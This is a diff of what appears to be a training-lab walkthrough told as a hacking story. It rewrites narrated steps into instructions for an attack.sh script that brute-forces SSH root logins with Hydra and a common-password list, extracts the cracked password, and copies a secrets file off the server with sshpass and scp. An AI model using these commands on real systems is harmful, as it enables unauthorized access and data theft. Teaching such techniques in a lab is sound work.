@@ -8,17 +8,17 @@ Until one day, when a whistleblower sent a message to the Dark Kittens, sharing 
 
 You decide to try hacking into the SSH server and grab the secret keys. 
 
-On a Linux machine, you opened a terminal. Next, you did the following:
-1. You created a script called attack.sh.
-2. Inside it, you added `#!/bin/bash` at the top of the file.
-3. After that, you added the details of the host, `root` as username, and the path to their secrets file that you got from your informer. The file was supposingly stored in /tmp/sensitive-info.txt file.
-4. Next, you created the following line, where you sent the path to a file containing a list of the most common passwords to Hydra:
-```hydra -l $username -P passwd $host ssh > result.txt```
-5. Then, you added the command to fetch the password and store it in a file called result.txt:
-```password=$(grep "password:" result.txt | awk '{print $2}')```
-6. With the purpose of analyzing the secrets file fetched from the Globomantics network, you added the following command to copy the file to your machine:
-```scp $username:$secrets_file .```
-7. You launched the script.
+On a Linux machine, open a terminal. Next, you need to do the following:
+1. Create a script called attack.sh.
+2. Inside it, add `#!/bin/bash` at the top of the file.
+3. After that, add the details of the host, `root` as username, and the path to their secrets file that you got from your informer. The file was supposingly stored in /tmp/sensitive-info.txt file.
+4. Next, create the following line, where you sent the path to a file containing a list of the most common passwords to Hydra:
+```hydra -l $username -P passwd.txt $host ssh -o result.txt```
+5. Then, add the command to fetch the password and store it in a file called result.txt:
+```password=$(grep 'login:password' result.txt | awk '{print $3}')```
+6. With the purpose of analyzing the secrets file fetched from the Globomantics network, add the following command to copy the file to your machine:
+```sshpass -p "${password}" scp "${username}@${host}:${secrets_file_path}" "${local_path}"```
+7. Launch the script.
 
 And the result was successful. You managed to extract the following secrets:
 
